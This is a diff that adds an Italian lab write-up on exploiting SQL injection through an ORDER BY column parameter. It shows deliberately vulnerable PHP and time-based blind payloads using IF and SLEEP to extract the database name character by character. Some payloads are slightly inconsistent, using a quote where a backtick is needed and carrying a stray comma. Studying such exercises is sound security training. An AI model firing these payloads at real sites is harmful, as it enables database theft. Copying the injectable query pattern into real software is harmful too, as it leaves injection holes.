@@ -729,21 +729,81 @@ In questo modo l'ouput interessante ora è compattato in un unica colonna.
 <br><br>
 
 
-## SQL Injection 2:
+## SQL Injection 8:
 
 
+È presente una query che prende in ingresso il nome della colonna su cui fare l'ordinamento.  
+È presente anche un filtro che elimina i caratteri sleciali dalla query (escluso il carattere backtick `).  
 
-```bash
+
+```php
+<?php
+
+  require_once('../header.php');
+  require_once('db.php');
+	$sql = "SELECT * FROM users ORDER BY `";
+	$sql .= mysql_real_escape_string($_GET["order"])."`";
+	$result = mysql_query($sql);
+	
+	if ($result) {
+		?>
+		<table  class='table table-striped'>
+		<tr>
+			<th><a href="example8.php?order=id">id</th>
+			<th><a href="example8.php?order=name">name</th>
+			<th><a href="example8.php?order=age">age</th>
+		</tr>
+		<?php
+		while ($row = mysql_fetch_assoc($result)) {
+			echo "<tr>";
+    			echo "<td>".$row['id']."</td>";
+    			echo "<td>".$row['name']."</td>";
+    			echo "<td>".$row['age']."</td>";
+			echo "</tr>";
+		}	
+		echo "</table>";
+	}
+    require '../footer.php';
+?>
 ```
 
 
+**Vulnerabilità:** 
+- Output verboso dovuto al server in modalità debug
+- Costruzione della pagina web che mette a disposizione un oracolo (quando la query genera un errore non viene stasmpato l'header della tabella).  
+
+La query contiene una clausola `ORDER BY` che impedisce di utilizzare una UNION per concatenare query arbitrarie.  
+
+Per questo esercizio va costruito un **distinguisher** ossia un meccanismo per verificare la presenza di una proprietà dalla sua assenza e usarlo per estrarre informazioni dal database.  
+- Per costruirlo si usa un cortocircuito logico assieme ad uno statement osservabile (una sleep)  
+- IF(espressione,val1,val2) $\rightarrow$ è uno statement sql che restituisce un risultato in base all'espressione booleana passata come argoemento.  
 
 
 
+Per trovare il nome del database:
+
+```
+name' OR IF(LENGTH(DATABASE())=1,SLEEP(1),NULL)%23
+name' OR IF(LENGTH(DATABASE())=2,SLEEP(1),NULL)%23
+
+...
+name' OR IF(LENGTH(DATABASE())=8,SLEEP(1),NULL)%23
+name' OR IF(LENGTH(DATABASE())=9,SLEEP(1),NULL)%23 -> chiama sleep!
+name' OR IF(LENGTH(DATABASE())=10,SLEEP(1),NULL)%23
+```
+
+A quesnto punto sappiamo che il nostro DB è composto da una stringa di 9 caratteri, per determinare quali sono i caratteri che formano la stringa usiamo un distinguisher simile a prima e sfruttiamo la ricerca binaria.  
+Inoltre useremo anche le funzioni: `SUBSTRING(str,start,number_chars)`e `ASCII('n')` che ci aiutano ad estrarre unas sottostringa di dimensioni arbitrarie (nel nostro caso cercheremo carattere per carattere) e ottenere il loro codice ASCII.  
 
 
 
+```
+name` OR IF(ASCII(SUBSTRING(DATABASE(), 1, 1)) > 80, SLEEP(2), 1) %23
+name` OR IF (ASCII(SUBSTRING(DATABASE(), 2, 1,)) > NN, SLEEP(1), 1)%23
+```
 
+
+Andando avanti in questo modo e sfruttando al ricerca binaria riusciamo ad estrarre il nome del database abbastanza in fretta, ricorda che se la condizione IF viene valutata positiva allora si ha il timeout, altrimenti non si ha nessun timeout. 
 
 
 
